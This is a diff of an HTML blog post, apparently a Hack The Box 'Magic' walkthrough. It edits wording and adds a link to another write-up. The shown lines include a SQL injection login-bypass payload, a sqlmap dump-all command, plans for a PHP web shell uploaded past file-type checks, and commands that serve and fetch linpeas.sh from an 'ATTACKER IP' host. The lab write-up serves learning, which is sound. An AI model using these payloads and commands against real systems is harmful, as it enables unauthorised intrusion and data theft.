@@ -72,7 +72,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 <h1 id="enumeration">Enumeration</h1>
 
-<p>lets take a look at the application hosted on port <strong>80</strong> if any…</p>
+<p>Take a look at the application hosted on port <strong>80</strong> if any…</p>
 
 <p><img src="/assets/magic/1.png" alt="1" /></p>
 
@@ -101,15 +101,15 @@ Service detection performed. Please report any incorrect results at https://nmap
 <div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">username=admin'</span><span class="w"> </span><span class="err">or</span><span class="w"> </span><span class="err">'=&amp;password=admin</span><span class="w">
 </span></code></pre></div></div>
 
-<p>Nice, looks like we have a different response. A <strong>redirection</strong> from the server <code class="language-plaintext highlighter-rouge">HTTP/1.1 302 Found</code>.</p>
+<p>nice, looks like we have a different response. A <strong>redirection</strong> from the server <code class="language-plaintext highlighter-rouge">HTTP/1.1 302 Found</code>.</p>
 
 <p><img src="/assets/magic/4.png" alt="4" /></p>
 
-<p>Now we can officially say that we have <strong>SQL Injection</strong> attack.</p>
+<p>we can officially say that we have <strong>SQL Injection</strong> attack.</p>
 
 <h1 id="initial-foothold-sqli--bypass-file-upload-restriction">Initial Foothold, Sqli &amp; Bypass File Upload Restriction</h1>
 
-<p>lets grab the login HTTP request from <strong>Repeater</strong> in <strong>Burp Suite</strong> and save to a file.</p>
+<p>Grab the login HTTP request from <strong>Repeater</strong> in <strong>Burp Suite</strong> and save to a file.</p>
 
 <p>start sqlmap tools with providing the following options:</p>
 <pre><code class="language-sqlmap">sqlmap -r file --threads 10 --batch --risk 3 --level 5 --dump-all
@@ -120,11 +120,11 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 <p>first thing comes to mind is file upload restriction issues, hence the name of the machine is “Magic” and a famous technique to prevent “malicious File Upload” in development word is called “Magic Number”.</p>
 
-<p>Where a developer can implement “Magic Number” and chooses a specific type of files to be accepted and saved on the server.</p>
+<p>where a developer can implement “Magic Number” and chooses a specific type of files to be accepted and saved on the server.</p>
 
-<p>It called “Magic Number” becuase, it reads the first 4 bytes of the file. Matching it with file extenstion to determine whether to accept or refuse based on the extension and file signature that the developer hardcoded in the application.</p>
+<p>it’s called “Magic Number” becuase, it reads the first 4 bytes of the file. Matching it with file extenstion to determine whether to accept or refuse based on the extension and file signature that the developer hardcoded in the application.</p>
 
-<p>Now lets try upload an image and look for the path of the uploaded image.</p>
+<p>try upload an image and look for the path of the uploaded image.</p>
 
 <p>…</p>
 
@@ -144,7 +144,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 <p>chaning the extenstion to <code class="language-plaintext highlighter-rouge">.sh</code> isn’t working. But what about adding a single qoute again <code class="language-plaintext highlighter-rouge">'</code> then following it with <code class="language-plaintext highlighter-rouge">.png</code> ? what could possibley happen?</p>
 
-<p>lets praper right for exploitation. first we need to get a small good php shell, better if one liner.</p>
+<p>first we need to get a small good php shell, better if one liner.</p>
 
 <p>here is a good one made by <a href="https://github.com/KINGSABRI/WebShellConsole/blob/master/shells/shell.php">KingSabri</a></p>
 
@@ -179,7 +179,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 <p>we can see that the user is <strong>www-data</strong>.</p>
 
-<p>now lets look at sqlmap result then we get back to getting a reverse shell.</p>
+<p>now lets take a look at sqlmap result, then we’ll get back to a file upload vulnerability</p>
 
 <pre><code class="language-sqlmap">Database: Magic
 Table: login
@@ -252,14 +252,14 @@ theseus@10.10.10.185: Permission denied (publickey).
 
 <h1 id="post-exploitation--root-own">Post Exploitation &amp; Root Own</h1>
 
-<p>lets run linux enumeration scripts like <a href="">linpeas.sh</a></p>
+<p>lets run linux enumeration scripts like <a href="https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh">linpeas.sh</a></p>
 
-<p>downlowd the script and run</p>
+<p>in same dir that the script is located. run this command to host it.</p>
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="p">.</span><span class="n">server</span> <span class="mi">80</span> <span class="o">--</span><span class="n">bind</span> <span class="n">ATTACKER</span> <span class="n">IP</span>
 </code></pre></div></div>
-<p>in same dir that the script is located.</p>
 
-<p>from theseuse box run the following:</p>
+<p>from ‘theseuse’ box run the following:</p>
+
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">theseus</span><span class="o">@</span><span class="n">ubuntu</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">wget</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">ATTACKER</span> <span class="n">IP</span><span class="o">/</span><span class="n">linpeas</span><span class="p">.</span><span class="n">sh</span>
 <span class="n">theseus</span><span class="o">@</span><span class="n">ubuntu</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">chmod</span> <span class="mi">777</span> <span class="n">linpeas</span><span class="p">.</span><span class="n">sh</span>
 <span class="n">theseus</span><span class="o">@</span><span class="n">ubuntu</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="p">.</span><span class="o">/</span><span class="n">LinEnum</span><span class="p">.</span><span class="n">sh</span>
@@ -346,7 +346,7 @@ theseus@10.10.10.185: Permission denied (publickey).
   <li>MEM Usage</li>
 </ol>
 
-<p>running strings against ‘/bin/sysinfo’ and grep for above words with <code class="language-plaintext highlighter-rouge">-A1</code> option to get 1 line after each word.</p>
+<p>running <code class="language-plaintext highlighter-rouge">strings</code> tools against ‘/bin/sysinfo’ and grep for above words with <code class="language-plaintext highlighter-rouge">-A1</code> option to get 1 line after each word.</p>
 
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">theseus</span><span class="o">@</span><span class="n">ubuntu</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">strings</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sysinfo</span> <span class="o">|</span> <span class="n">grep</span> <span class="s">'Hardware\|Disk\|CPU\|MEM'</span> <span class="o">-</span><span class="n">A1</span>
 
@@ -412,6 +412,14 @@ theseus@10.10.10.185: Permission denied (publickey).
     
       <li>
         <h3>
+          <a href="/hack%20the%20box/2021/07/23/HTB-Active.html">
+            HTB-Active
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
           <a href="/hack%20the%20box/2020/09/05/HTB-Mango.html">
             HTB-Mango
           </a>
@@ -426,7 +434,7 @@ theseus@10.10.10.185: Permission denied (publickey).
 
   
   <h2>all tags</h2>
-  <div class="tag-cloud"><a href="/tag/htb/" class="set-5">HTB</a> <a href="/tag/magic/" class="set-1">Magic</a> <a href="/tag/mango/" class="set-1">Mango</a></div>
+  <div class="tag-cloud"><a href="/tag/active/" class="set-1">Active</a> <a href="/tag/htb/" class="set-5">HTB</a> <a href="/tag/magic/" class="set-1">Magic</a> <a href="/tag/mango/" class="set-1">Mango</a></div>
   
 
 
